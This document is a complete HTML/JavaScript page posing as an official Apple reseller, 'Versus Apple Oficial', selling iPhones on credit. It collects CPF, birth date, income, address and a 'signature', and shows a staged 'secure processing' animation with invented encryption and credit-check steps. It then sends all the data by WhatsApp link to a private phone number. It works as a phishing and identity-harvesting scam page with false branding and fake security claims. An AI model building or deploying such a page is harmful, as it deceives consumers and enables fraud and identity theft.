<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<title>Versus Apple Oficial</title>

<style>
body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
    background: #f5f5f7;
    margin: 0;
}

.container {
    max-width: 420px;
    margin: 40px auto;
    background: #fff;
    padding: 30px;
    border-radius: 20px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.08);
}

h2 { text-align:center; }
.insta { text-align:center; color:#6e6e73; margin-bottom:20px; }

h3 { margin-top:25px; }

label {
    font-size:13px;
    color:#6e6e73;
    margin-top:10px;
    display:block;
}

input, select, textarea {
    width:100%;
    padding:14px;
    margin-top:5px;
    border-radius:12px;
    border:1px solid #d2d2d7;
    background:#fafafa;
}

button {
    width:100%;
    padding:16px;
    margin-top:25px;
    border:none;
    border-radius:14px;
    background:linear-gradient(135deg,#6a0dad,#8e44ad);
    color:#fff;
    font-weight:bold;
    cursor:pointer;
}

.footer {
    font-size:12px;
    text-align:center;
    margin-top:15px;
    color:#777;
}
</style>
</head>

<body>

<div class="container">

<h2>Versus Apple Oficial</h2>
<div class="insta">iPhones & Acessórios • Central de Vendas</div>

<h3>Dados Pessoais</h3>

<label>Nome completo</label>
<input id="nome">

<label>CPF</label>
<input id="cpf">

<label>Data de nascimento</label>
<input type="date" id="nascimento">

<label>E-mail</label>
<input id="email">

<label>Telefone (WhatsApp)</label>
<input id="telefone">

<label>Renda mensal</label>
<select id="renda">
<option value="">Selecione</option>
<option>Até R$1.500</option>
<option>R$1.500 a R$3.000</option>
<option>R$3.000 a R$5.000</option>
<option>Acima de R$5.000</option>
</select>

<h3>Compra</h3>

<label>Aparelhos com disponibilidade</label>
<select id="aparelho">
<option value="">Selecione</option>
<option>11 Pro Max 256GB</option>
<option>12 Pro Max 256GB</option>
<option>13 256GB</option>
<option>13 Pro Max 256GB</option>
<option>14 256GB</option>
<option>14 Pro 256GB</option>
<option>14 Pro Max 256GB</option>
<option>15 256GB</option>
<option>15 Plus 256GB</option>
<option>15 Pro 256GB</option>
<option>15 Pro Max 256GB</option>
<option>16 256GB</option>
<option>16 Pro 256GB</option>
<option>16 Pro Max 256GB</option>
<option>17 256GB</option>
<option>17 Air 256GB</option>
<option>17 Pro 256GB</option>
<option>17 Pro Max 256GB</option>
<option>PlayStation 5 Slim 1TB</option>
</select>

<label>Dia de vencimento</label>
<input id="vencimento">

<h3>Endereço</h3>

<label>CEP</label>
<input id="cep" onblur="buscarCEP()">

<label>Rua</label>
<input id="rua">

<label>Número</label>
<input id="numero">

<label>Bairro</label>
<input id="bairro">

<label>Cidade</label>
<input id="cidade">

<label>Estado</label>
<input id="estado">

<label>Observações para entrega</label>
<textarea id="observacao"></textarea>

<label style="display:flex;align-items:center;margin-top:15px;">
<input type="checkbox" id="termos" style="width:auto;margin-right:10px;">
Aceito os termos e responsabilidade financeira
</label>

<label>Assinatura digital</label>
<input id="assinatura">

<button onclick="enviar()">Continuar para Análise de Crédito</button>

<div class="footer">
🔒 Ambiente seguro • Dados protegidos
</div>

</div>

<script>

// máscara telefone
document.getElementById("telefone").addEventListener("input", function(e){
 let v = e.target.value.replace(/\D/g,"");
 if(v.length > 11) v = v.slice(0,11);
 if(v.length > 10){
  v = v.replace(/^(\d{2})(\d{5})(\d{4}).*/, "($1) $2-$3");
 } else if(v.length > 6){
  v = v.replace(/^(\d{2})(\d{4})(\d{0,4}).*/, "($1) $2-$3");
 } else if(v.length > 2){
  v = v.replace(/^(\d{2})(\d{0,5})/, "($1) $2");
 } else {
  v = v.replace(/^(\d*)/, "($1");
 }
 e.target.value = v;
});

// CEP
function buscarCEP(){
 let cep = document.getElementById("cep").value.replace(/\D/g,'');
 if(cep.length==8){
 fetch(`https://viacep.com.br/ws/${cep}/json/`)
 .then(r=>r.json())
 .then(d=>{
  document.getElementById("rua").value=d.logradouro||"";
  document.getElementById("bairro").value=d.bairro||"";
  document.getElementById("cidade").value=d.localidade||"";
  document.getElementById("estado").value=d.uf||"";
 });
 }
}

// gerar
function gerarProtocolo(){
 return "VS" + Math.floor(Math.random() * 1000000000);
}

function gerarCodigo(){
 return Math.random().toString(36).substring(2,8).toUpperCase();
}

// enviar
function enviar(){

let nome = document.getElementById("nome").value;
let cpf = document.getElementById("cpf").value;
let nascimento = document.getElementById("nascimento").value;
let email = document.getElementById("email").value;
let telefone = document.getElementById("telefone").value;
let renda = document.getElementById("renda").value;

let aparelho = document.getElementById("aparelho").value;
let vencimento = document.getElementById("vencimento").value;

let cep = document.getElementById("cep").value;
let rua = document.getElementById("rua").value;
let numero = document.getElementById("numero").value;
let bairro = document.getElementById("bairro").value;
let cidade = document.getElementById("cidade").value;
let estado = document.getElementById("estado").value;

let observacao = document.getElementById("observacao").value;
let termos = document.getElementById("termos").checked;
let assinatura = document.getElementById("assinatura").value;

if(!nome || !cpf || !telefone || !aparelho){
 alert("Preencha os campos obrigatórios");
 return;
}

if(!termos){
 alert("Aceite os termos");
 return;
}

if(!assinatura){
 alert("Assinatura obrigatória");
 return;
}

// TELA PREMIUM
document.body.innerHTML = `
<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#a855f7;font-family:sans-serif;">
<div style="width:300px;">

<h2 style="text-align:center;color:#c084fc;">🔐 Processamento Seguro</h2>

<div style="height:8px;background:#222;border-radius:10px;margin:20px 0;">
<div id="barra" style="height:100%;width:0%;background:#a855f7;border-radius:10px;"></div>
</div>

<p id="porcentagem" style="text-align:center;">0%</p>

<div id="status"></div>

</div>
</div>
`;

let etapas = [
 "Criptografando dados...",
 "Validando informações...",
 "Consultando sistema...",
 "Gerando contrato...",
 "Finalizando análise..."
];

let progresso = 0;
let etapaIndex = 0;

let intervalo = setInterval(()=>{
 progresso++;

 document.getElementById("barra").style.width = progresso + "%";
 document.getElementById("porcentagem").innerText = progresso + "%";

 if(progresso % 20 === 0 && etapaIndex < etapas.length){
   document.getElementById("status").innerHTML += `<p>✔ ${etapas[etapaIndex]}</p>`;
   etapaIndex++;
 }

 if(progresso >= 100){
   clearInterval(intervalo);
   finalizarEnvio();
 }

}, 40);

// FINAL
function finalizarEnvio(){

let protocolo = gerarProtocolo();
let codigo = gerarCodigo();

let mensagem = `📄 FORMALIZAÇÃO DE COMPRA - VERSUS APPLE OFICIAL

Protocolo: ${protocolo}
Código de validação: ${codigo}

━━━━━━━━━━━━━━━━━━━━━━━
👤 DADOS DO TITULAR
Nome: ${nome}
CPF: ${cpf}
Nascimento: ${nascimento}
E-mail: ${email}
Telefone: ${telefone}
Renda: ${renda}

━━━━━━━━━━━━━━━━━━━━━━━
📱 DADOS DA COMPRA
Aparelho: ${aparelho}
Vencimento: ${vencimento}

━━━━━━━━━━━━━━━━━━━━━━━
📍 ENDEREÇO PARA ENTREGA
CEP: ${cep}
Rua: ${rua}, Nº ${numero}
Bairro: ${bairro}
Cidade: ${cidade}
Estado: ${estado}

Observações: ${observacao}

━━━━━━━━━━━━━━━━━━━━━━━
✍️ CONFIRMAÇÃO
Assinatura digital: ${assinatura}

Cadastro finalizado com sucesso.

Em instantes você receberá as instruções de compra referentes ao dispositivo selecionado.
`;

let url = "https://wa.me/5511944967694?text=" + encodeURIComponent(mensagem);

setTimeout(()=>{
 window.location.href = url;
}, 800);
}

}
</script>

</body>
</html>
